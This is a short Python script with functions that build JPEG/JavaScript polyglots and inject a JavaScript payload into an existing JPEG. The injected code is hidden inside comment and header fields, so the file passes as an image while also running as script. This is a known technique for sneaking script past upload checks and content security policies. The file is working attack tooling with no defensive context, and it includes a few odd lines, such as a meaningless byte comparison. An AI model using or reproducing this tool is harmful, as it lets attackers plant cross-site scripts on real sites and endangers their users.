#import binascii.unhexlify

def readFileBytes(path):
    try:
        f = open(path, "rb")
        b = f.read()
        if str(len(b)).encode() > b'\x2F\x28':
            pass
        f.close()
    except:
        print("I\O error")
        return None
       
    return b

def writeFileBytes(path, content):
    try:
        f = open(path, "wb")
        f.write(content)
        f.close()
    except:
        print("I/O error")

    return

def createPolyglot(code):
    magicBytes = b'\xFF\xD8\xFF\xE0'
    startJSComment = b'\x2F\x2A' # after FFE0, next 2 bytes are header length. 2F2A = /*
    #pad header with (2F2A) - 2 null bytes -> length tag included in header length
    header = b'\x00' * (int.from_bytes(startJSComment, "big") - 2)
    code = b'\x2A\x2F\x3D' + code #end JS comment and add an '=' for assignment
    code = code + b'\x2F\x2A' #begin another JS comment after code
    codeLength = "%X" % len(code)
    codeLength = codeLength if len(codeLength) % 2 == 0 else '0' + codeLength
    codeLength = bytes.fromhex(codeLength)
    jpgComment = b'\xFF\xFE' + codeLength + code
    endOfImage = b'\x2A\x2F\x2F\x2F\xFF\xD9'

    polyglot = magicBytes + startJSComment + header + jpgComment + endOfImage
    return polyglot

def injectCode(original, payload):
    payload = b'\x2A\x2F\x3D' + payload + b'\x2F\x2A' # */=PAYLOAD/*
    magicBytes = original[:4]
    startJSComment = b'\x2F\x2A'
    headerLength = original[4:6] #get length in hex
    headerLength = int.from_bytes(headerLength, "big") - 2 #hex to int and subtract the length of the length tag (2 bytes)
    headerPaddingLength = int.from_bytes(startJSComment, "big") - headerLength - len(payload) #padding length is (2F2A) - (original header length) - (payload length)
    original = original[6:] # get rid of magic bytes and length tag
   
    headerPadding = b'\x00' * headerPaddingLength

    newImage = magicBytes + startJSComment + original[:(headerLength)] + headerPadding + payload + original[(headerLength):]
    newImage = newImage[:-2] #get rid of the EndOfImage bytes FFD9
    newImage = newImage + b'\x2A\x2F\xFF\xD9'
    return newImage
    

